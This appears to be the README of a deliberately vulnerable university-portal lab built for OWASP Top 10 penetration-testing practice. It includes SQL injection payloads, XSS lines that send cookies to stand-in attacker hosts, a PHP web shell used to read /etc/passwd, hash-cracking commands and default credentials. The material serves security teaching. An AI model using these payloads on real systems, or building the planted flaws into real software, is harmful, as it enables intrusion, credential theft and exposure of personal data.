# 🎓 Code Academy University — Vulnerable Web Application Lab

```
╔══════════════════════════════════════════════════════════════╗
║  ⚠️  SECURITY WARNING — EDUCATIONAL USE ONLY ⚠️             ║
║                                                              ║
║  This application contains DELIBERATE security             ║
║  vulnerabilities for penetration testing practice.         ║
║                                                              ║
║  ❌ DO NOT deploy on a public-facing server                 ║
║  ❌ DO NOT use real personal data                           ║
║  ✅ Run ONLY in an isolated lab/VM environment              ║
╚══════════════════════════════════════════════════════════════╝
```

---

## 📋 Table of Contents

1. [Project Overview](#overview)
2. [Complete Directory Structure](#directory-structure)
3. [Technology Stack](#technology-stack)
4. [Vulnerabilities Index](#vulnerabilities-index)
5. [Deployment Instructions](#deployment-instructions)
6. [Lab Exercises — Step-by-Step Exploits](#lab-exercises)
7. [Default Credentials](#default-credentials)
8. [Network Map](#network-map)

---

## 1. Project Overview <a name="overview"></a>

**Code Academy University (CAU)** is a realistic-looking university information portal built with deliberate OWASP Top 10 vulnerabilities planted throughout the codebase for penetration testing education.

### What's included

| Feature | Location | Notes |
|---|---|---|
| Public homepage, About, Courses, Admissions | `/public/*.php` | Reflected XSS, SQLi search |
| Contact form | `/public/contact.php` | Clean (for contrast) |
| Student/Teacher Login | `/public/auth/login.php` | SQLi + user enumeration |
| Student Dashboard | `/public/portal/dashboard.php` | Stored XSS display |
| Profile Management | `/public/portal/profile.php` | IDOR + Stored XSS + File Upload RCE |
| Grades View | `/public/portal/grades.php` | IDOR — any student's grades |
| Campus Messaging | `/public/portal/messages.php` | Stored XSS sink |
| Course Registration | `/public/portal/register.php` | Standard (for contrast) |
| API Explorer | `/public/portal/api-demo.php` | Shows internal API interaction |
| Internal Flask API | `api/app.py` | Unauthenticated, verbose errors, SQLi |

---

## 2. Complete Directory Structure <a name="directory-structure"></a>

```
cau-university/
├── docker-compose.yml              ← Orchestration (A05: default creds, exposed ports)
│
├── nginx/
│   └── nginx.conf                  ← Reverse proxy (A05: missing security headers)
│
├── database/
│   └── init/
│       └── 01_init.sql             ← Schema + seed data (A07: MD5 passwords)
│
├── api/                            ← Container 2: Python/Flask API
│   ├── Dockerfile
│   ├── requirements.txt            ← A06: outdated Flask/Werkzeug
│   └── app.py                      ← A04: no auth, verbose errors, SQLi, env dump
│
└── website/                        ← Container 1: PHP Application
    ├── Dockerfile
    ├── apache.conf                  ← A05: directory listing, no security headers
    │
    ├── public/                      ← Web root (served by Apache)
    │   ├── index.php                ← A03: Reflected XSS (?msg=)
    │   ├── about.php
    │   ├── courses.php
    │   ├── admissions.php
    │   ├── contact.php
    │   ├── search.php               ← A03: SQLi + Reflected XSS (?q=)
    │   │
    │   ├── auth/
    │   │   ├── login.php            ← A03: SQLi via loginUser() + A07: user enum
    │   │   └── logout.php           ← A07: token not invalidated
    │   │
    │   ├── portal/
    │   │   ├── dashboard.php        ← A03: Stored XSS (message subjects)
    │   │   ├── profile.php          ← A01: IDOR + A03: Stored XSS + A08: file upload
    │   │   ├── grades.php           ← A01: IDOR (?student_id=)
    │   │   ├── messages.php         ← A03: Stored XSS (subject + body)
    │   │   ├── register.php
    │   │   └── api-demo.php         ← A04: internal API proxy/explorer
    │   │
    │   ├── css/
    │   │   ├── main.css
    │   │   └── portal.css
    │   │
    │   └── js/
    │       ├── main.js              ← A06: loads jQuery 1.8.3
    │       └── portal.js
    │
    ├── src/
    │   ├── config/
    │   │   ├── database.php         ← A05: hardcoded creds
    │   │   └── auth.php             ← A03: SQLi in loginUser() + A07: weak sessions
    │   │
    │   └── views/
    │       └── partials/
    │           ├── nav.php
    │           ├── footer.php
    │           ├── portal_nav.php
    │           └── portal_sidebar.php
    │
    └── uploads/                     ← A08: world-writable, PHP execution allowed
```

---

## 3. Technology Stack <a name="technology-stack"></a>

| Container | Technology | Port |
|---|---|---|
| `cau_nginx` | Nginx 1.21 (reverse proxy) | **80** (host) |
| `cau_website` | PHP 7.4 + Apache | **8080** (host direct) |
| `cau_api` | Python 3.9 + Flask 2.0.3 | **5000** (host) |
| `cau_db` | MySQL 5.7 | **3306** (host) |

---

## 4. Vulnerabilities Index <a name="vulnerabilities-index"></a>

### 🔴 A01:2021 — Broken Access Control (IDOR)

| File | Line | Exploit |
|---|---|---|
| `portal/profile.php` | ~19 | `GET /portal/profile.php?id=2` (view Emily's profile) |
| `portal/grades.php`  | ~18 | `GET /portal/grades.php?student_id=2` (view Emily's grades) |
| `api/app.py`         | `/students/<id>` | `curl http://localhost:5000/students/2` |

**Impact:** Any authenticated student can view any other student's profile including SSN, address, grades.

---

### 🔴 A03:2021 — SQL Injection

| File | Endpoint | Payload |
|---|---|---|
| `auth.php` `loginUser()` | POST `/auth/login.php` | `username = admin'--` |
| `search.php` | GET `/search.php?q=` | `' UNION SELECT 1,username,password,email,5,6,7,8 FROM users--` |
| `api/app.py` `/search` | GET `/search?name=` | `' UNION SELECT 1,username,password,ssn,5,6 FROM users--` |

**Login Bypass:**
```
username: admin'--
password: anything
```

**Data Extraction via Search:**
```
/search.php?q=' UNION SELECT 1,code,name,description,credits,semester FROM courses--
/search.php?q=' UNION SELECT id,username,password,email,5,6 FROM users--
```

---

### 🔴 A03:2021 — Cross-Site Scripting (XSS)

#### Reflected XSS
```
# Homepage message parameter
GET /?msg=<script>alert(document.cookie)</script>

# Search query reflected
GET /search.php?q=<img src=x onerror=alert(1)>
```

#### Stored XSS
```
# Via profile bio (profile.php edit form)
Bio field: <script>document.location='http://10.0.0.1/?c='+document.cookie</script>

# Via message subject (messages.php compose form)
Subject: <img src=x onerror="fetch('http://attacker/steal?c='+document.cookie)">
```

---

### 🔴 A04:2021 — Insecure Design (API)

All API endpoints require **zero authentication**:

```bash
# Dump all students with SSNs
curl http://localhost:5000/students

# Get specific student with SSN + address
curl http://localhost:5000/students/1

# Dump ALL users with password hashes
curl http://localhost:5000/users

# Dump environment variables (includes DB_PASS)
curl http://localhost:5000/debug

# API health — reveals DB config
curl http://localhost:5000/health
```

---

### 🔴 A05:2021 — Security Misconfiguration

- **Default DB password:** `root` / `root` (MySQL on port 3306)
- **Debug mode active:** Flask Werkzeug debugger at port 5000
- **Directory listing:** Apache `Options Indexes` enabled
- **Server version disclosure:** `ServerTokens Full`
- **Missing headers:** No CSP, X-Frame-Options, X-Content-Type-Options
- **PHP uploads execute:** No `php_flag engine off` on `/uploads/`
- **Env vars in compose:** DB creds in plaintext `docker-compose.yml`

---

### 🔴 A06:2021 — Vulnerable & Outdated Components

| Component | Version | CVEs |
|---|---|---|
| jQuery | 1.8.3 (2012) | CVE-2011-4969, CVE-2015-9251, many more |
| Flask | 2.0.3 | CVE-2023-30861 |
| Werkzeug | 2.0.3 | CVE-2023-25577 |
| MySQL | 5.7 (EOL Oct 2023) | Multiple |
| Nginx | 1.21 | Minor CVEs |

---

### 🔴 A07:2021 — Identification & Authentication Failures

- **Passwords hashed with unsalted MD5** — crack with `hashcat -m 0`
- **Default credentials:** all students use `Password1`
- **Session token = MD5(username + timestamp)** — predictable
- **HttpOnly / Secure flags missing** on session cookie
- **User enumeration** on login: different errors for "wrong password" vs "no account"
- **Session not invalidated on logout** — token persists in DB

**Crack demo:**
```bash
# MD5('Password1') = 7c6a180b36896a0a8c02787eeafb0e4c
echo "7c6a180b36896a0a8c02787eeafb0e4c:Password1" | hashcat -m 0
```

---

### 🔴 A08:2021 — Software & Data Integrity Failures (File Upload RCE)

**Location:** `portal/profile.php` profile photo upload

**Exploit — PHP Web Shell Upload:**
1. Create `shell.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Upload via Profile → Edit Profile → Profile Photo
3. Access: `http://localhost:8080/uploads/shell.php?cmd=id`
4. Result: Remote code execution as `www-data`

**Why it works:** Server only checks file size, not extension or MIME type. Apache serves PHP files from `/uploads/`.

---

## 5. Deployment Instructions <a name="deployment-instructions"></a>

### Prerequisites

- Docker Engine 20.10+
- Docker Compose 2.0+
- 2GB free RAM

### Step 1 — Clone / Set up the project

```bash
# Navigate to the project directory
cd cau-university

# Verify structure
ls -la
```

### Step 2 — Build and start all containers

```bash
# Build images and start in detached mode
docker compose up --build -d

# Watch startup logs (wait for MySQL to initialize ~30 seconds)
docker compose logs -f

# Verify all 4 containers are running
docker compose ps
```

Expected output:
```
NAME          IMAGE         STATUS    PORTS
cau_nginx     nginx:1.21    Up        0.0.0.0:80->80/tcp
cau_website   cau-website   Up        0.0.0.0:8080->80/tcp
cau_api       cau-api       Up        0.0.0.0:5000->5000/tcp
cau_db        mysql:5.7     Up        0.0.0.0:3306->3306/tcp
```

### Step 3 — Verify the application

```bash
# Main website (via Nginx)
curl -I http://localhost/

# Direct PHP (bypass Nginx)
curl -I http://localhost:8080/

# Flask API
curl http://localhost:5000/

# Database direct
mysql -h 127.0.0.1 -P 3306 -u root -proot university_db -e "SELECT username, password FROM users;"
```

### Step 4 — Access in browser

| URL | Description |
|---|---|
| `http://localhost/` | Main university website |
| `http://localhost/auth/login.php` | Student portal login |
| `http://localhost:5000/` | Flask API root (no auth) |
| `http://localhost:5000/users` | All user records + password hashes |
| `http://localhost:5000/debug` | Environment variables dump |
| `http://localhost:8080/` | Direct PHP (bypasses Nginx) |

### Stopping the lab

```bash
# Stop containers (preserve data)
docker compose stop

# Stop and remove containers + volumes
docker compose down -v

# Full cleanup including images
docker compose down -v --rmi all
```

---

## 6. Lab Exercises <a name="lab-exercises"></a>

### Exercise 1 — SQL Injection Login Bypass
**Goal:** Login as admin without knowing the password.
```
URL:      http://localhost/auth/login.php
Method:   POST
Username: admin'--
Password: wrong_password
Result:   Logged in as System Admin
```

### Exercise 2 — UNION-Based SQL Injection (Data Extraction)
**Goal:** Extract all username/password hashes via search.
```
URL:    http://localhost/search.php
Param:  ?q=' UNION SELECT 1,username,password,email,5,6 FROM users-- 
Result: All usernames and MD5 hashes returned in course results
```

### Exercise 3 — IDOR (Insecure Direct Object Reference)
**Goal:** View another student's grades/SSN as a low-privilege student.
```
Login as:  jsmith / Password1
Visit:     http://localhost/portal/grades.php?student_id=2
Result:    Emily Johnson's full grade transcript and GPA
Visit:     http://localhost/portal/profile.php?id=2
Result:    Emily's profile including SSN: 234-56-7890
```

### Exercise 4 — Stored XSS via Profile Bio
**Goal:** Plant a JavaScript payload that fires on anyone viewing your profile.
```
Login as:  jsmith / Password1
Go to:     http://localhost/portal/profile.php → Edit Profile → Bio
Enter:     <img src=x onerror="alert('XSS: '+document.cookie)">
Save, then visit your own profile URL
Result:    JavaScript executes, cookie displayed
```

### Exercise 5 — File Upload RCE (Webshell)
**Goal:** Upload a PHP webshell disguised as a profile photo.
```
1. Create file: shell.php
   Content: <?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>
2. Login as jsmith, go to Edit Profile
3. Upload shell.php as Profile Photo
4. Visit: http://localhost/uploads/shell.php?cmd=whoami
5. Visit: http://localhost/uploads/shell.php?cmd=cat+/etc/passwd
```

### Exercise 6 — Unauthenticated API Data Dump
**Goal:** Extract all student PII and password hashes from the API without authentication.
```bash
# Get all student SSNs, addresses, phone numbers
curl -s http://localhost:5000/students | python3 -m json.tool

# Get all password hashes
curl -s http://localhost:5000/users | python3 -m json.tool | grep password

# Dump all environment variables including DB credentials
curl -s http://localhost:5000/debug | python3 -m json.tool
```

### Exercise 7 — Crack MD5 Password Hashes
**Goal:** Crack the extracted password hashes.
```bash
# Save hashes to file
echo "7c6a180b36896a0a8c02787eeafb0e4c" > hashes.txt  # Password1

# Crack with hashcat (MD5 mode = 0)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Or with john
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Exercise 8 — API SQL Injection
**Goal:** Extract all users via UNION injection in the API search endpoint.
```bash
curl "http://localhost:5000/search?name=%27%20UNION%20SELECT%201,username,password,email,ssn,6%20FROM%20users--"
```

### Exercise 9 — Reflected XSS
**Goal:** Craft a URL that steals cookies.
```
http://localhost/?msg=<script>document.location='http://attacker.com/?c='+document.cookie</script>
http://localhost/search.php?q=<img src=x onerror=alert(document.cookie)>
```

### Exercise 10 — Session Analysis
**Goal:** Identify the weak session token generation and predict tokens.
```
1. Login and capture the UNIVERSITY_SESS cookie value
2. The token = MD5(username + unix_timestamp_of_login)
3. The token range is predictable within ±60 seconds of observed login
```

---

## 7. Default Credentials <a name="default-credentials"></a>

### Application Users

| Username | Password | Role | Notes |
|---|---|---|---|
| `jsmith` | `Password1` | Student | John Smith, CS Year 3 |
| `ejohnson` | `Password1` | Student | Emily Johnson, Data Science |
| `mwilliams` | `Password1` | Student | Mike Williams, Cybersecurity |
| `sbrown` | `Password1` | Student | Sarah Brown, SE Year 1 |
| `adavis` | `Password1` | Student | Alex Davis, CS Year 2 |
| `prof_jones` | `Teacher1` | Teacher | Dr. Robert Jones |
| `prof_chen` | `Teacher1` | Teacher | Dr. Lisa Chen |
| `admin` | `admin123` | Admin | System Administrator |

### Infrastructure

| Service | Credential |
|---|---|
| MySQL root | `root` / `root` |
| MySQL host | `127.0.0.1:3306` |
| DB name | `university_db` |

---

## 8. Network Map <a name="network-map"></a>

```
Internet / Host Machine
        │
        ├─── :80  ──► [Nginx Reverse Proxy] ──► :80 [PHP Website]
        │                                    └──► :5000 [Flask API] (via /api/ path)
        │
        ├─── :8080 ──► [PHP Website] (direct, bypasses Nginx)
        │
        ├─── :5000 ──► [Flask API] (EXPOSED — no auth!)
        │                     │
        └─── :3306 ──► [MySQL] (EXPOSED — default creds!)

Internal Docker Network: university_net
  cau_website  ──(DB_HOST=db)──► cau_db
  cau_api      ──(DB_HOST=db)──► cau_db
  cau_nginx    ──(proxy)───────► cau_website
               ──(proxy /api/)─► cau_api
```

---

## References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks Web Pentesting](https://book.hacktricks.xyz/pentesting-web)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

*Built for educational penetration testing practice. All vulnerabilities are intentional. Never deploy on public infrastructure.*
